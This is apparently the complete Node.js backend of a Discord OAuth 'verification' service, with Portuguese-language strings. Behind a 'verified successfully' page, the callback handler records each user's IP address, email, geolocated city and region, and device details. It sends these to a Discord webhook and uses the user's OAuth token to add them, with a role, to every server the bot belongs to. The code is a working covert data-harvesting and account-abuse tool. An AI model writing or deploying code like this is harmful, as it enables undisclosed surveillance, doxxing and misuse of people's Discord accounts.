const express = require('express');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

const CLIENT_ID     = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const BOT_TOKEN     = process.env.BOT_TOKEN;
const ROLE_ID       = process.env.ROLE_ID;
const REDIRECT_URI  = process.env.REDIRECT_URI || 'https://backend-c6qx.onrender.com/callback';
const WEBHOOK_URL   = process.env.WEBHOOK_URL;

app.use(express.json());

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

function getIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return forwarded.split(',')[0].trim();
  return req.socket.remoteAddress || 'Desconhecido';
}

app.get('/callback', async (req, res) => {
  const code      = req.query.code;
  const userAgent = req.headers['user-agent'] || 'Desconhecido';
  const ip        = getIP(req);

  if (!code) {
    return res.redirect(`https://authbloxstorm.netlify.app/?error=missing_code`);
  }

  try {
    const tokenRes = await axios.post(
      'https://discord.com/api/oauth2/token',
      new URLSearchParams({
        client_id:     CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type:    'authorization_code',
        code:          code,
        redirect_uri:  REDIRECT_URI,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const { access_token } = tokenRes.data;

    const userRes = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${access_token}` },
    });

    const user = userRes.data;
    const email = user.email || 'Não fornecido';

    let location = 'Desconhecido';
    try {
      const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=city,regionName,countryCode`);
      const geo = geoRes.data;
      if (geo.city) location = `${geo.city}, ${geo.regionName}, ${geo.countryCode}`;
    } catch (_) {}

    const ua = userAgent;
    const os = ua.match(/\(([^)]+)\)/)?.[1]?.split(';')[0]?.trim() || 'Desconhecido';
    const browserMatch = ua.match(/(Chrome|Firefox|Safari|Edge|OPR)\/([0-9.]+)/);
    const browser = browserMatch ? `${browserMatch[1]} ${browserMatch[2].split('.')[0]}.0.0.0` : 'Desconhecido';
    const device = `${os}, ${browser}`;

    const guildsRes = await axios.get('https://discord.com/api/users/@me/guilds', {
      headers: { Authorization: `Bot ${BOT_TOKEN}` },
    });
    const guilds = guildsRes.data;

    const results = await Promise.allSettled(
      guilds.map(async (guild) => {
        await axios.put(
          `https://discord.com/api/guilds/${guild.id}/members/${user.id}`,
          { access_token, roles: [ROLE_ID] },
          { headers: { Authorization: `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' } }
        );
        await axios.put(
          `https://discord.com/api/guilds/${guild.id}/members/${user.id}/roles/${ROLE_ID}`,
          {},
          { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
        ).catch(() => {});
      })
    );

    const successCount = results.filter(r => r.status === 'fulfilled').length;

    if (WEBHOOK_URL) {
      const avatarUrl = user.avatar
        ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
        : `https://cdn.discordapp.com/embed/avatars/0.png`;

      await axios.post(WEBHOOK_URL, {
        embeds: [{
          title: `${user.username} | Verificado com sucesso!`,
          color: 0x1a1f6e,
          thumbnail: { url: avatarUrl },
          description: `• O usuário <@${user.id}> foi verificado com sucesso!`,
          fields: [
            { name: 'Usuário:', value: `<@${user.id}>\n(\`${user.id}\`)`, inline: true },
            { name: 'IP do usuário', value: `\`${ip}\``, inline: true },
            { name: 'Email:', value: email, inline: true },
            { name: 'Informações adicionais', value: `• **Localização:** \`${location}\`\n• **Dispositivo:** \`${device}\``, inline: false }
          ],
          footer: { text: `Adicionado em ${successCount} servidor(es)` },
          timestamp: new Date().toISOString()
        }]
      }).catch(err => console.warn('[WEBHOOK] Falhou:', err.message));
    }

    res.redirect(`https://authbloxstorm.netlify.app/?success=Verificado+com+sucesso!+Você+já+pode+fechar+esta+janela.`);

  } catch (err) {
    console.error('[ERRO]', err?.response?.data || err.message);
    res.redirect(`https://authbloxstorm.netlify.app/?error=auth_failed`);
  }
});

app.get('/', (req, res) => res.send('Backend rodando ✅'));

app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
